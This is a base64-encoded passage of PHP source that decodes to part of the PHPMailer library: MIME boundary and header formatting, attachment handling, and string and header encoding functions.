QzEzNDEgcGFydCA1IHNheXMgN2JpdCBpcyBhc3N1bWVkIGlmIG5vdCBzcGVjaWZpZWQKICAgICAgICBpZiAoJGVuY29kaW5nICE9ICc3Yml0JykgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nJywgJGVuY29kaW5nKTsKICAgICAgICB9CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+TEU7CgogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIHRoZSBlbmQgb2YgYSBtZXNzYWdlIGJvdW5kYXJ5LgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvdW5kYXJ5CiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZW5kQm91bmRhcnkoJGJvdW5kYXJ5KQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+TEUgLiAnLS0nIC4gJGJvdW5kYXJ5IC4gJy0tJyAuICR0aGlzLT5MRTsKICAgIH0KCiAgICAvKioKICAgICAqIFNldCB0aGUgbWVzc2FnZSB0eXBlLgogICAgICogUEhQTWFpbGVyIG9ubHkgc3VwcG9ydHMgc29tZSBwcmVzZXQgbWVzc2FnZSB0eXBlcywgbm90IGFyYml0cmFyeSBNSU1FIHN0cnVjdHVyZXMuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZXRNZXNzYWdlVHlwZSgpCiAgICB7CiAgICAgICAgJHR5cGUgPSBhcnJheSgpOwogICAgICAgIGlmICgkdGhpcy0+YWx0ZXJuYXRpdmVFeGlzdHMoKSkgewogICAgICAgICAgICAkdHlwZVtdID0gJ2FsdCc7CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+aW5saW5lSW1hZ2VFeGlzdHMoKSkgewogICAgICAgICAgICAkdHlwZVtdID0gJ2lubGluZSc7CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+YXR0YWNobWVudEV4aXN0cygpKSB7CiAgICAgICAgICAgICR0eXBlW10gPSAnYXR0YWNoJzsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPm1lc3NhZ2VfdHlwZSA9IGltcGxvZGUoJ18nLCAkdHlwZSk7CiAgICAgICAgaWYgKCR0aGlzLT5tZXNzYWdlX3R5cGUgPT0gJycpIHsKICAgICAgICAgICAgLy9UaGUgJ3BsYWluJyBtZXNzYWdlX3R5cGUgcmVmZXJzIHRvIHRoZSBtZXNzYWdlIGhhdmluZyBhIHNpbmdsZSBib2R5IGVsZW1lbnQsIG5vdCB0aGF0IGl0IGlzIHBsYWluLXRleHQKICAgICAgICAgICAgJHRoaXMtPm1lc3NhZ2VfdHlwZSA9ICdwbGFpbic7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogRm9ybWF0IGEgaGVhZGVyIGxpbmUuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHBhcmFtIHN0cmluZyAkdmFsdWUKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBoZWFkZXJMaW5lKCRuYW1lLCAkdmFsdWUpCiAgICB7CiAgICAgICAgcmV0dXJuICRuYW1lIC4gJzogJyAuICR2YWx1ZSAuICR0aGlzLT5MRTsKICAgIH0KCiAgICAvKioKICAgICAqIFJldHVybiBhIGZvcm1hdHRlZCBtYWlsIGxpbmUuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkdmFsdWUKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiB0ZXh0TGluZSgkdmFsdWUpCiAgICB7CiAgICAgICAgcmV0dXJuICR2YWx1ZSAuICR0aGlzLT5MRTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhbiBhdHRhY2htZW50IGZyb20gYSBwYXRoIG9uIHRoZSBmaWxlc3lzdGVtLgogICAgICogTmV2ZXIgdXNlIGEgdXNlci1zdXBwbGllZCBwYXRoIHRvIGEgZmlsZSEKICAgICAqIFJldHVybnMgZmFsc2UgaWYgdGhlIGZpbGUgY291bGQgbm90IGJlIGZvdW5kIG9yIHJlYWQuCiAgICAgKiBFeHBsaWNpdGx5ICpkb2VzIG5vdCogc3VwcG9ydCBwYXNzaW5nIFVSTHM7IFBIUE1haWxlciBpcyBub3QgYW4gSFRUUCBjbGllbnQuCiAgICAgKiBJZiB5b3UgbmVlZCB0byBkbyB0aGF0LCBmZXRjaCB0aGUgcmVzb3VyY2UgeW91cnNlbGYgYW5kIHBhc3MgaXQgaW4gdmlhIGEgbG9jYWwgZmlsZSBvciBzdHJpbmcuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoIFBhdGggdG8gdGhlIGF0dGFjaG1lbnQuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lIE92ZXJyaWRlcyB0aGUgYXR0YWNobWVudCBuYW1lLgogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgRmlsZSBlbmNvZGluZyAoc2VlICRFbmNvZGluZykuCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlIEZpbGUgZXh0ZW5zaW9uIChNSU1FKSB0eXBlLgogICAgICogQHBhcmFtIHN0cmluZyAkZGlzcG9zaXRpb24gRGlzcG9zaXRpb24gdG8gdXNlCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRBdHRhY2htZW50KCRwYXRoLCAkbmFtZSA9ICcnLCAkZW5jb2RpbmcgPSAnYmFzZTY0JywgJHR5cGUgPSAnJywgJGRpc3Bvc2l0aW9uID0gJ2F0dGFjaG1lbnQnKQogICAgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGlmICghc2VsZjo6aXNQZXJtaXR0ZWRQYXRoKCRwYXRoKSBvciAhQGlzX2ZpbGUoJHBhdGgpKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdmaWxlX2FjY2VzcycpIC4gJHBhdGgsIHNlbGY6OlNUT1BfQ09OVElOVUUpOwogICAgICAgICAgICB9CgogICAgICAgICAgICAvLyBJZiBhIE1JTUUgdHlwZSBpcyBub3Qgc3BlY2lmaWVkLCB0cnkgdG8gd29yayBpdCBvdXQgZnJvbSB0aGUgZmlsZSBuYW1lCiAgICAgICAgICAgIGlmICgkdHlwZSA9PSAnJykgewogICAgICAgICAgICAgICAgJHR5cGUgPSBzZWxmOjpmaWxlbmFtZVRvVHlwZSgkcGF0aCk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRmaWxlbmFtZSA9IGJhc2VuYW1lKCRwYXRoKTsKICAgICAgICAgICAgaWYgKCRuYW1lID09ICcnKSB7CiAgICAgICAgICAgICAgICAkbmFtZSA9ICRmaWxlbmFtZTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnRbXSA9IGFycmF5KAogICAgICAgICAgICAgICAgMCA9PiAkcGF0aCwKICAgICAgICAgICAgICAgIDEgPT4gJGZpbGVuYW1lLAogICAgICAgICAgICAgICAgMiA9PiAkbmFtZSwKICAgICAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLAogICAgICAgICAgICAgICAgNCA9PiAkdHlwZSwKICAgICAgICAgICAgICAgIDUgPT4gZmFsc2UsIC8vIGlzU3RyaW5nQXR0YWNobWVudAogICAgICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgICAgICA3ID0+IDAKICAgICAgICAgICAgKTsKCiAgICAgICAgfSBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm4gdGhlIGFycmF5IG9mIGF0dGFjaG1lbnRzLgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0QXR0YWNobWVudHMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YXR0YWNobWVudDsKICAgIH0KCiAgICAvKioKICAgICAqIEF0dGFjaCBhbGwgZmlsZSwgc3RyaW5nLCBhbmQgYmluYXJ5IGF0dGFjaG1lbnRzIHRvIHRoZSBtZXNzYWdlLgogICAgICogUmV0dXJucyBhbiBlbXB0eSBzdHJpbmcgb24gZmFpbHVyZS4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcGFyYW0gc3RyaW5nICRkaXNwb3NpdGlvbl90eXBlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib3VuZGFyeQogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGF0dGFjaEFsbCgkZGlzcG9zaXRpb25fdHlwZSwgJGJvdW5kYXJ5KQogICAgewogICAgICAgIC8vIFJldHVybiB0ZXh0IG9mIGJvZHkKICAgICAgICAkbWltZSA9IGFycmF5KCk7CiAgICAgICAgJGNpZFVuaXEgPSBhcnJheSgpOwogICAgICAgICRpbmNsID0gYXJyYXkoKTsKCiAgICAgICAgLy8gQWRkIGFsbCBhdHRhY2htZW50cwogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7CiAgICAgICAgICAgIC8vIENoZWNrIGlmIGl0IGlzIGEgdmFsaWQgZGlzcG9zaXRpb25fZmlsdGVyCiAgICAgICAgICAgIGlmICgkYXR0YWNobWVudFs2XSA9PSAkZGlzcG9zaXRpb25fdHlwZSkgewogICAgICAgICAgICAgICAgLy8gQ2hlY2sgZm9yIHN0cmluZyBhdHRhY2htZW50CiAgICAgICAgICAgICAgICAkc3RyaW5nID0gJyc7CiAgICAgICAgICAgICAgICAkcGF0aCA9ICcnOwogICAgICAgICAgICAgICAgJGJTdHJpbmcgPSAkYXR0YWNobWVudFs1XTsKICAgICAgICAgICAgICAgIGlmICgkYlN0cmluZykgewogICAgICAgICAgICAgICAgICAgICRzdHJpbmcgPSAkYXR0YWNobWVudFswXTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJHBhdGggPSAkYXR0YWNobWVudFswXTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkaW5jbGhhc2ggPSBtZDUoc2VyaWFsaXplKCRhdHRhY2htZW50KSk7CiAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoJGluY2xoYXNoLCAkaW5jbCkpIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRpbmNsW10gPSAkaW5jbGhhc2g7CiAgICAgICAgICAgICAgICAkbmFtZSA9ICRhdHRhY2htZW50WzJdOwogICAgICAgICAgICAgICAgJGVuY29kaW5nID0gJGF0dGFjaG1lbnRbM107CiAgICAgICAgICAgICAgICAkdHlwZSA9ICRhdHRhY2htZW50WzRdOwogICAgICAgICAgICAgICAgJGRpc3Bvc2l0aW9uID0gJGF0dGFjaG1lbnRbNl07CiAgICAgICAgICAgICAgICAkY2lkID0gJGF0dGFjaG1lbnRbN107CiAgICAgICAgICAgICAgICBpZiAoJGRpc3Bvc2l0aW9uID09ICdpbmxpbmUnICYmIGFycmF5X2tleV9leGlzdHMoJGNpZCwgJGNpZFVuaXEpKSB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkY2lkVW5pcVskY2lkXSA9IHRydWU7CgogICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJy0tJXMlcycsICRib3VuZGFyeSwgJHRoaXMtPkxFKTsKICAgICAgICAgICAgICAgIC8vT25seSBpbmNsdWRlIGEgZmlsZW5hbWUgcHJvcGVydHkgaWYgd2UgaGF2ZSBvbmUKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJG5hbWUpKSB7CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoCiAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGU6ICVzOyBuYW1lPSIlcyIlcycsCiAgICAgICAgICAgICAgICAgICAgICAgICR0eXBlLAogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJG5hbWUpKSwKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPkxFCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoCiAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGU6ICVzJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAkdHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPkxFCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vIFJGQzEzNDEgcGFydCA1IHNheXMgN2JpdCBpcyBhc3N1bWVkIGlmIG5vdCBzcGVjaWZpZWQKICAgICAgICAgICAgICAgIGlmICgkZW5jb2RpbmcgIT0gJzdiaXQnKSB7CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2Rpbmc6ICVzJXMnLCAkZW5jb2RpbmcsICR0aGlzLT5MRSk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRkaXNwb3NpdGlvbiA9PSAnaW5saW5lJykgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCdDb250ZW50LUlEOiA8JXM+JXMnLCAkY2lkLCAkdGhpcy0+TEUpOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIC8vIElmIGEgZmlsZW5hbWUgY29udGFpbnMgYW55IG9mIHRoZXNlIGNoYXJzLCBpdCBzaG91bGQgYmUgcXVvdGVkLAogICAgICAgICAgICAgICAgLy8gYnV0IG5vdCBvdGhlcndpc2U6IFJGQzIxODMgJiBSRkMyMDQ1IDUuMQogICAgICAgICAgICAgICAgLy8gRml4ZXMgYSB3YXJuaW5nIGluIElFVEYncyBtc2dsaW50IE1JTUUgY2hlY2tlcgogICAgICAgICAgICAgICAgLy8gQWxsb3cgZm9yIGJ5cGFzc2luZyB0aGUgQ29udGVudC1EaXNwb3NpdGlvbiBoZWFkZXIgdG90YWxseQogICAgICAgICAgICAgICAgaWYgKCEoZW1wdHkoJGRpc3Bvc2l0aW9uKSkpIHsKICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZF9uYW1lID0gJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCRuYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goJy9bIFwoXCk8PkAsOzpcXCJcL1xbXF1cPz1dLycsICRlbmNvZGVkX25hbWUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtRGlzcG9zaXRpb246ICVzOyBmaWxlbmFtZT0iJXMiJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGVuY29kZWRfbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5MRSAuICR0aGlzLT5MRQogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGVuY29kZWRfbmFtZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LURpc3Bvc2l0aW9uOiAlczsgZmlsZW5hbWU9JXMlcycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRlbmNvZGVkX25hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPkxFIC4gJHRoaXMtPkxFCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtRGlzcG9zaXRpb246ICVzJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRkaXNwb3NpdGlvbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TEUgLiAkdGhpcy0+TEUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgLy8gRW5jb2RlIGFzIHN0cmluZyBhdHRhY2htZW50CiAgICAgICAgICAgICAgICBpZiAoJGJTdHJpbmcpIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPmVuY29kZVN0cmluZygkc3RyaW5nLCAkZW5jb2RpbmcpOwogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+aXNFcnJvcigpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5lbmNvZGVGaWxlKCRwYXRoLCAkZW5jb2RpbmcpOwogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+aXNFcnJvcigpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJy0tJXMtLSVzJywgJGJvdW5kYXJ5LCAkdGhpcy0+TEUpOwoKICAgICAgICByZXR1cm4gaW1wbG9kZSgnJywgJG1pbWUpOwogICAgfQoKICAgIC8qKgogICAgICogRW5jb2RlIGEgZmlsZSBhdHRhY2htZW50IGluIHJlcXVlc3RlZCBmb3JtYXQuCiAgICAgKiBSZXR1cm5zIGFuIGVtcHR5IHN0cmluZyBvbiBmYWlsdXJlLgogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aCBUaGUgZnVsbCBwYXRoIHRvIHRoZSBmaWxlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZyBUaGUgZW5jb2RpbmcgdG8gdXNlOyBvbmUgb2YgJ2Jhc2U2NCcsICc3Yml0JywgJzhiaXQnLCAnYmluYXJ5JywgJ3F1b3RlZC1wcmludGFibGUnCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBlbmNvZGVGaWxlKCRwYXRoLCAkZW5jb2RpbmcgPSAnYmFzZTY0JykKICAgIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoIXNlbGY6OmlzUGVybWl0dGVkUGF0aCgkcGF0aCkgb3IgIWZpbGVfZXhpc3RzKCRwYXRoKSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZmlsZV9vcGVuJykgLiAkcGF0aCwgc2VsZjo6U1RPUF9DT05USU5VRSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJG1hZ2ljX3F1b3RlcyA9IGZhbHNlOwogICAgICAgICAgICBpZiggdmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNy40LjAnLCAnPCcpICkgewogICAgICAgICAgICAgICAgJG1hZ2ljX3F1b3RlcyA9IGdldF9tYWdpY19xdW90ZXNfcnVudGltZSgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkbWFnaWNfcXVvdGVzKSB7CiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4zLjAnLCAnPCcpKSB7CiAgICAgICAgICAgICAgICAgICAgc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKGZhbHNlKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgLy9Eb2Vzbid0IGV4aXN0IGluIFBIUCA1LjQsIGJ1dCB3ZSBkb24ndCBuZWVkIHRvIGNoZWNrIGJlY2F1c2UKICAgICAgICAgICAgICAgICAgICAvL2dldF9tYWdpY19xdW90ZXNfcnVudGltZSBhbHdheXMgcmV0dXJucyBmYWxzZSBpbiA1LjQrCiAgICAgICAgICAgICAgICAgICAgLy9zbyBpdCB3aWxsIG5ldmVyIGdldCBoZXJlCiAgICAgICAgICAgICAgICAgICAgaW5pX3NldCgnbWFnaWNfcXVvdGVzX3J1bnRpbWUnLCBmYWxzZSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGZpbGVfYnVmZmVyID0gZmlsZV9nZXRfY29udGVudHMoJHBhdGgpOwogICAgICAgICAgICAkZmlsZV9idWZmZXIgPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCRmaWxlX2J1ZmZlciwgJGVuY29kaW5nKTsKICAgICAgICAgICAgaWYgKCRtYWdpY19xdW90ZXMpIHsKICAgICAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjMuMCcsICc8JykpIHsKICAgICAgICAgICAgICAgICAgICBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoJG1hZ2ljX3F1b3Rlcyk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGluaV9zZXQoJ21hZ2ljX3F1b3Rlc19ydW50aW1lJywgJG1hZ2ljX3F1b3Rlcyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICRmaWxlX2J1ZmZlcjsKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgcmV0dXJuICcnOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIEVuY29kZSBhIHN0cmluZyBpbiByZXF1ZXN0ZWQgZm9ybWF0LgogICAgICogUmV0dXJucyBhbiBlbXB0eSBzdHJpbmcgb24gZmFpbHVyZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0ciBUaGUgdGV4dCB0byBlbmNvZGUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIFRoZSBlbmNvZGluZyB0byB1c2U7IG9uZSBvZiAnYmFzZTY0JywgJzdiaXQnLCAnOGJpdCcsICdiaW5hcnknLCAncXVvdGVkLXByaW50YWJsZScKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlU3RyaW5nKCRzdHIsICRlbmNvZGluZyA9ICdiYXNlNjQnKQogICAgewogICAgICAgICRlbmNvZGVkID0gJyc7CiAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRlbmNvZGluZykpIHsKICAgICAgICAgICAgY2FzZSAnYmFzZTY0JzoKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gY2h1bmtfc3BsaXQoYmFzZTY0X2VuY29kZSgkc3RyKSwgNzYsICR0aGlzLT5MRSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnN2JpdCc6CiAgICAgICAgICAgIGNhc2UgJzhiaXQnOgogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+Zml4RU9MKCRzdHIpOwogICAgICAgICAgICAgICAgLy8gTWFrZSBzdXJlIGl0IGVuZHMgd2l0aCBhIGxpbmUgYnJlYWsKICAgICAgICAgICAgICAgIGlmIChzdWJzdHIoJGVuY29kZWQsIC0oc3RybGVuKCR0aGlzLT5MRSkpKSAhPSAkdGhpcy0+TEUpIHsKICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZCAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYmluYXJ5JzoKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHN0cjsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdxdW90ZWQtcHJpbnRhYmxlJzoKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPmVuY29kZVFQKCRzdHIpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2VuY29kaW5nJykgLiAkZW5jb2RpbmcpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkZW5jb2RlZDsKICAgIH0KCiAgICAvKioKICAgICAqIEVuY29kZSBhIGhlYWRlciBzdHJpbmcgb3B0aW1hbGx5LgogICAgICogUGlja3Mgc2hvcnRlc3Qgb2YgUSwgQiwgcXVvdGVkLXByaW50YWJsZSBvciBub25lLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cgogICAgICogQHBhcmFtIHN0cmluZyAkcG9zaXRpb24KICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVIZWFkZXIoJHN0ciwgJHBvc2l0aW9uID0gJ3RleHQnKQogICAgewogICAgICAgICRtYXRjaGNvdW50ID0gMDsKICAgICAgICBzd2l0Y2ggKHN0cnRvbG93ZXIoJHBvc2l0aW9uKSkgewogICAgICAgICAgICBjYXNlICdwaHJhc2UnOgogICAgICAgICAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvW1wyMDAtXDM3N10vJywgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAvLyBDYW4ndCB1c2UgYWRkc2xhc2hlcyBhcyB3ZSBkb24ndCBrbm93IHRoZSB2YWx1ZSBvZiBtYWdpY19xdW90ZXNfc3liYXNlCiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWQgPSBhZGRjc2xhc2hlcygkc3RyLCAiXDAuLlwzN1wxNzdcXFwiIik7CiAgICAgICAgICAgICAgICAgICAgaWYgKCgkc3RyID09ICRlbmNvZGVkKSAmJiAhcHJlZ19tYXRjaCgnL1teQS1aYS16MC05ISMkJSZcJyorXC89P15fYHt8fX4gLV0vJywgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkZW5jb2RlZCk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgiXCIkZW5jb2RlZFwiIik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJG1hdGNoY291bnQgPSBwcmVnX21hdGNoX2FsbCgnL1teXDA0MFwwNDFcMDQzLVwxMzNcMTM1LVwxNzZdLycsICRzdHIsICRtYXRjaGVzKTs